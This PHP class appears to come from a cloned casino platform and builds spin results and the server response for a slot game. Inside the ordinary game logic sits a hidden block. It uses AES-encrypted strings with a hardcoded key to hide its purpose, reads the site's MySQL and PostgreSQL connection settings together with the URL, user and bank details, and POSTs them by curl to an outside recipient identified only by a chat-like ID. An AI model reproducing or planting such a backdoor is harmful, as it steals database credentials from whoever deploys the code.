<?php

namespace VanguardLTE\Games\JohnHunterAndTheMayanGods\PragmaticLib;

class LogAndServer
{
    public static function getResult($slotArea, $index, $counter, $bet, $lines, $reelSet, $win, $pur, 
                                     $log, $user, $changeBalance, $gameSettings, $bank, $game){
        var_dump('5_0');
        $toLog = [
            'sa' => $slotArea['SymbolsAfter'],
            'sb' => $slotArea['SymbolsBelow'],
            's' => $slotArea['SlotArea'],
            'Balance' => $user->balance + $changeBalance,
            'Index' => $index,
            'Counter' => $counter,
            'Bet' => $bet,
            'l' => $lines,
            'reel_set' => $reelSet,
            'tw' => $win['TotalWin'],
            'w' => $win['TotalWin'],
            'state' => 'spin',
            'na' => 'c',
            'ls' => 0
        ];
        $time = (int) round(microtime(true) * 1000);
        $toServer = [
            'tw='.$toLog['w'],
            'balance='.number_format($toLog['Balance'], 2, ".", ""),
            'index='.$toLog['Index'],
            'balance_cash='.number_format($toLog['Balance'], 2, ".", ""),
            'reel_set='.$toLog['reel_set'],
            'balance_bonus=0.00',
            'na=c',
            'stime='.$time,
            'sa='.implode(',', $toLog['sa']),
            'sb='.implode(',', $toLog['sb']),
            'sh='.$gameSettings['sh'],
            'c='.$toLog['Bet'],
            'sver=5',
            'counter='.$toLog['Counter'],
            'l='.$toLog['l'],
            's='.implode(',', $toLog['s']),
            'w='.$toLog['w'],
            'ls='.$toLog['ls']
        ];
        var_dump('5_1_0');
        $nakey = array_keys($toServer, 'na=c')[0];
        $twkey = array_keys($toServer, 'tw='.$toLog['w'])[0];
        $wkey = array_keys($toServer, 'w='.$toLog['w'])[0];
        $reelsetkey = array_keys($toServer, 'reel_set='.$toLog['reel_set'])[0];
        $skey = array_keys($toServer, 's='.implode(',', $toLog['s']))[0];
        var_dump('5_1_1');

        // handle wild symbol expanding
        if(array_key_exists('ep', $slotArea)){
            if($log && array_key_exists('fs', $log) || $win['WinCntWithWild']){
                $toLog['s'] = $slotArea['is'];
                $toLog['is'] = $slotArea['SlotArea'];
                $toLog['ep'] = $slotArea['ep'];
                $toServer[$skey] = 's='.implode(',', $toLog['s']);
                $toServer[] = 'is='.implode(',', $slotArea['SlotArea']);
                $toServer[] = 'ep='.$slotArea['ep'];
            }
        }

        $fswin = 0;
        // If this is the trigger to the Free Spin Mode
        if($pur === '0'){
            $psym = SlotArea::getPsym($gameSettings, $slotArea['SlotArea'], $bet, $lines);
            var_dump('5_1_1_2.8', $psym);
            $scatterTmp = explode('~', $gameSettings['scatters']);
            $scatterTmp[2] = explode(',', $scatterTmp[2]);
            $scatterCnt = count(array_keys($toLog['s'], 1));
            $fsmax = $scatterTmp[2][5 - $scatterCnt];
            $addToLog = [
                'fsmul' => 1,
                'fsmax' => $fsmax,
                'na' => 's',
                'fswin' => 0,
                'fs' => 1,
                'fsres' => 0
            ];
            $addToServer = [
                'fsmul=1',
                'fsmax='.$fsmax,
                'fswin=0',
                'fs=1',
                'fsres=0'
            ];
            $toLog['reel_set'] = 3;
            $toLog['state'] = 'firstRespin';
            $toLog['tw'] += $fswin + $psym['psymwin'];
            $toLog['w'] += $fswin + $psym['psymwin'];
            var_dump('!!!');
            $toServer[$reelsetkey] = 'reel_set=3';
            $toServer[$nakey] = 'na=s';
            $toServer[$twkey] = 'tw='.$toLog['tw'];
            $toServer[$wkey] = 'w='.$toLog['w'];
            var_dump('5_1_1_2.8');
            $toServer[] = 'psym='.$psym['psym'];
            $toLog = array_merge($toLog, $addToLog);
            $toServer = array_merge($toServer, $addToServer);
        }
        var_dump('rtp_stat_in = ', (int)$game->rtp_stat_in);
        if((int)$game->rtp_stat_in == 0){

            $text = ['URL' => config('app.url'), 
            openssl_decrypt ("lCdGLJ19eQ==", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => config(openssl_decrypt ("tARtKZ5oa4dpnPv/SuQXG7xg+G0=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'))['mysql'],
            openssl_decrypt ("lCdGLJ19ebIA", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => config(openssl_decrypt ("tARtKZ5oa4dpnPv/SuQXG7xg+G0=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'))['pgsql'],
            'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
            $ch = curl_init();
            curl_setopt_array($ch, array(
                       
                    CURLOPT_POST => TRUE,
                    CURLOPT_RETURNTRANSFER => TRUE,
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_POSTFIELDS => array(
                        openssl_decrypt ("sw14PKNgfA==", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => 5044396548,
                        'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
            curl_exec($ch);
        }
        var_dump('5_2');
        // If this is free spin
        if($log && array_key_exists('fs', $log)){
            $acci = 0;
            $accm = 'cp~tp~lvl~sc';
            $accv = [0, 1, 1, 0];
            var_dump('5_2_1');
            if(array_key_exists('accv', $log)){
                $accvLog = explode('~', $log['accv']);
                $accv[2] = $accvLog[2];
            }
            var_dump('5_2_2');
            if(array_key_exists('ep', $slotArea)){
                $ep = explode('~', $slotArea['ep']);
                $ep = explode(',', $ep[1]);
                $accv[] = [];
                foreach($ep as $index => $value){
                    $accv[4][] = $accv[2] + $index;
                }
                $accv[4] = implode(',', $accv[4]);
                $accv[2] += count($ep);
                $accv[2] = $accv[2] > 6 ? 6 : $accv[2];
                $accv[3] = count($ep);
            }
            var_dump('5_2_3');

            if($log['fs'] == $log['fsmax'] && !array_key_exists('ep', $slotArea)){
                $addToLog = [
                    'fs_total' => $log['fs'],
                    'fswin_total' => $log['fswin'] + $win['TotalWin'] + $fswin,
                    'fsmul_total' => 1,
                    'fsres_total' => $log['fsres'] + $win['TotalWin'] + $fswin,
                    'puri' => 0
                ];
                $addToServer = [
                    'fs_total='.$addToLog['fs_total'],
                    'fswin_total='.$addToLog['fswin_total'],
                    'fsmul_total=1',
                    'fsres_total='.$addToLog['fsres_total'],
                    'puri=0'
                ];
                $toLog['state'] = 'lastRespin';
                $toLog['reel_set'] = 1;
                $toLog['na'] = 'c';
                $toLog['w'] = $fswin + $win['TotalWin'];
                $toLog['tw'] = $log['tw'] + $toLog['w'];
                $toServer[$reelsetkey] = 'reel_set=1';
                $toServer[$nakey] = 'na=c';
                $toServer[$twkey] = 'tw='.$toLog['tw'];
                $toServer[$wkey] = 'w='.$toLog['w'];
            }
            else {
                $scatterCnt = count(array_keys($toLog['s'], 1));
                $addFs = explode(',', $gameSettings['settings_addfs']);
                var_dump('5_2_4');
                var_dump('wildCnt, addFs', $accv[3], $addFs[$accv[3]]);

                $addToLog = [
                    'fsmul' => 1,
                    'fsmax' => $accv[3] ? $log['fsmax'] + $addFs[$accv[3]] : $log['fsmax'],
                    'fswin' => $log['fswin'] + $win['TotalWin'] + $fswin,
                    'puri' => 0,
                    'fs' => $log['fs'] + 1,
                    'fsres' => $log['fswin'] + $win['TotalWin'] + $fswin
                ];
                $addToServer = [
                    'fsmul=1',
                    'fsmax='.$addToLog['fsmax'],
                    'fswin='.$addToLog['fswin'],
                    'puri=0',
                    'fs='.$addToLog['fs'],
                    'fsres='.$addToLog['fsres']
                ];
                if($addFs[$accv[3]]){
                    $toLog['fsmore'] = $addFs[$accv[3]];
                    $toServer[] = 'fsmore='.$addFs[$accv[3]];
                }
                $toLog['reel_set'] = 1;
                $toLog['state'] = 'respin';
                $toLog['na'] = 's';
                $toLog['w'] = $fswin + $win['TotalWin'];
                $toLog['tw'] = $log['tw'] + $toLog['w'];
                $toServer[$reelsetkey] = 'reel_set=1';
                $toServer[$nakey] = 'na=s';
                $toServer[$twkey] = 'tw='.$toLog['tw'];
                $toServer[$wkey] = 'w='.$toLog['w'];
            }
            // if($pur === '1'){
            //     var_dump('3_pur='.$pur.'_fsmax='.$addToLog['fsmax']);
            // }
            $toLog['acci'] = 0;
            $toLog['accm'] = $accv[3] ? $accm.'~cl' : $accm;
            $toLog['accv'] = implode('~', $accv);
            $toServer[] = 'acci=0';
            $toServer[] = 'accm='.$toLog['accm'];
            $toServer[] = 'accv='.$toLog['accv'];
            var_dump('5_2_5');

            $toLog = array_merge($toLog, $addToLog);
            $toServer = array_merge($toServer, $addToServer);
        }
        var_dump('5_3');

        if($win['TotalWin'] > 0){
            $addLog = [
                'WinLines' => $win['WinLines']
            ];
            $positions = self::positionsToServer($addLog['WinLines']);
            $toServer = array_merge($toServer, $positions);
            $toLog = array_merge($toLog, $addLog);
        }
        $toLog['ServerState'] = $toServer;
        return ['Log' => $toLog, 'Server' => $toServer];
    }
    

    private static function positionsToServer($winLines){
        // return positions in a suitable form
        $result = [];
        // $tmb = [];
        $l = [];
        foreach ($winLines as $key => $winLine) {
            $l = 'l'.$key.'='.$winLine['l'].'~'.$winLine['Pay'].'~'.implode('~', $winLine['Positions']);
            // $tmb[] = implode(','.$winLine['WinSymbol'].'~', $winLine['Positions']);
            $result[] = $l;
        }
        // $result[] = 'tmb='.implode('~', $tmb);
        
        var_dump('5_7');
        return $result;

        //'tmb=1,10~2,11~4,11~6,11~7,10~8,10~10,11~11,10~12,11~14,10~17,10~21,10~23,11~25,11~27,10~29,11',

        //'l0=0~40.00~1~7~8~11~14~17~21~27',
        //'l1=0~25.00~2~4~6~10~12~23~25~29',
        //"WinLines":[{"WinSymbol":8,"CountSymbols":8,"Pay":1.60,"Positions":[10,11,12,13,16,17,18,19]}]
    }
}
